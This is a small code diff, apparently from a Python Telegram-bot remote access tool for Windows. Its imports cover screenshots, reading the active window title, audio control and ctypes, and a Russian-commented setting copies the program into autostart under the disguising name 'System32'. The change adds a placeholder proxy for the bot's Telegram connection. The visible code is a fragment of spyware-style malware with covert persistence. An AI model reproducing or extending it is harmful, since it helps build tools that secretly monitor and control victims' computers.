@@ -21,6 +21,7 @@ import urllib.request
 from PIL import ImageGrab
 from telebot import types
 from telebot import util
+from telebot import apihelper
 from ctypes import *
 from ctypes.wintypes import *
 from ctypes import cast, POINTER
@@ -28,6 +29,9 @@ from comtypes import CLSCTX_ALL
 from urllib.error import HTTPError
 from win32gui import GetWindowText, GetForegroundWindow
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+
+#Прокси (Если не работает)
+apihelper.proxy = {'http':'http://x.x.x.x:port'}
 
 #Название файла при копировании в автозагрузку
 fname = 'System32' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
